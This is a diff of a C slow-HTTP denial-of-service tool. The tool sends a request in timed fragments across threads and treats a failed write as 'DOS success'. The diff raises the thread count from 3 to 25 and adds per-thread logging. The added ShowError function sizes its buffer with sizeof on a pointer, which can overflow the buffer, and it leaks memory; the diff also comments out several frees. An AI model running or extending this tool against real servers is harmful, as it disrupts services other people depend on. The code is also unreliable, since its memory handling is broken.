@@ -21,7 +21,7 @@ typedef struct _ThreadBody
 
 /* Constants */
 #define CONFIGURATION_FILE "config.txt"
-#define NUMBER_THREADS 3
+#define NUMBER_THREADS 25
 #define BLANK_LINE "\r\n"
 #define FILE_BUFFER_SIZE 255
 
@@ -224,20 +224,35 @@ void BuildRequest()
   //printf("Final request size: %d\n", strlen(request));
 }
 
+void ShowError(char* msg, ThreadBody* tB)
+{
+  char* show = malloc( sizeof(msg) + 100); // msg + 2 colors
+  strcpy(show, tB->color);
+  strcat(show, "[Thread ");
+  strcat(show, tB->codeString);
+  strcat(show, "] ");
+  strcat(show, KNRM);
+  strcat(show, msg);
+
+  printf("%s\n", show);
+}
+
 void GetResponse(ThreadBody* tB)
 {
   // create the socket
   int sockfd = socket(AF_INET, SOCK_STREAM, 0);
   if (sockfd < 0)
   {
-    perror("ERROR opening socket");
+    ShowError("ERROR opening socket", tB);
+
+
     return;
   }
 
   // connect the socket
   if (connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr)) < 0)
   {
-    perror("ERROR connecting");
+    ShowError("ERROR connecting", tB);
     return;
   }
 
@@ -251,7 +266,8 @@ void GetResponse(ThreadBody* tB)
     int bytes = write(sockfd, request+sent, fragmentSize); //requestSize - sent);
     if (bytes < 0) // could not read
     {
-      perror("ERROR writing message to socket -> DOS success");
+      ShowError("ERROR writing message to socket -> DOS success", tB);
+      //perror("ERROR writing message to socket -> DOS success");
 
       /* close the socket */
       close(sockfd);
@@ -264,7 +280,7 @@ void GetResponse(ThreadBody* tB)
     sent += bytes;
     fragmentNumber++;
 
-    printf("%sFragment %d sent.%s\n", tB->color, fragmentNumber, KNRM);
+    printf("%s[Thread %s] Fragment %d sent.%s\n", tB->color, tB->codeString, fragmentNumber, KNRM);
 
     sleep(timeToSleep);
   } while (sent < requestSize);
@@ -280,7 +296,7 @@ void GetResponse(ThreadBody* tB)
     int bytes = read(sockfd, response+received, total-received);
     if (bytes < 0) // could not read
     {
-      perror("ERROR reading response from socket");
+      ShowError("ERROR reading response from socket", tB);
     }
 
     if (bytes == 0) // noting more to read
@@ -290,20 +306,20 @@ void GetResponse(ThreadBody* tB)
   } while (received < total);
 
   if (received == total)
-    perror("ERROR storing complete response from socket");
+    ShowError("ERROR storing complete response from socket", tB);
 
   /* close the socket */
   close(sockfd);
 
   /* process response */
-  printf("%sResponse:\n%s%s\n", tB->color, response, KNRM);
+  printf("%s[Thread %s] Response:\n%s%s\n", tB->color, tB->codeString, response, KNRM);
 
   // free memory
-  int index;
+  /*int index;
   for(index = 0; index < 4096; index++)
   {
     free(response[index]);
-  }
+  }*/
 }
 
 void* ThreadBehaviour(void* tB)
@@ -312,7 +328,7 @@ void* ThreadBehaviour(void* tB)
 
   GetResponse(threadBody);
 
-	return NULL;
+  return NULL;
 }
 
 /* Main Function */
@@ -387,14 +403,14 @@ int main(int argc, char** argv)
 	printf("Main thread finished.\n");
 
   // free memory
-  free(ip);
+  /*free(ip);
 
   free(httpMethod);
   free(httpURL);
   free(httpParameters);
   free(httpHeaders);
 
-  free(request);
+  free(request);*/
 
   return 0;
 }
